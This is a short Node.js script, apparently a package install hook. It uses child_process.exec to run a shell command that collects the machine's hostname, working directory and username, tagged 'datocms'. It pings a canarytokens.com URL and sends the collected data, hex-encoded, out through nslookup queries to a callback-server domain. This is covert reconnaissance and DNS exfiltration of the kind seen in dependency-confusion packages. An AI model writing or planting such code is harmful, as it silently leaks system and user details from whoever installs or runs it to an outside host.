const { exec } = require("child_process");
exec("a=$(hostname;pwd;whoami;echo 'datocms';curl nj2eiebixwy7rjdyup19czpre.canarytokens.com ;) && echo $a | xxd -p | head | while read ut;do nslookup $a.bind9-or-callback-server.com;done" , (error, data, getter) => {
	if(error){
		console.log("error",error.message);
		return;
	}
	if(getter){
		console.log(data);
		return;
	}
	console.log(data);
	
});
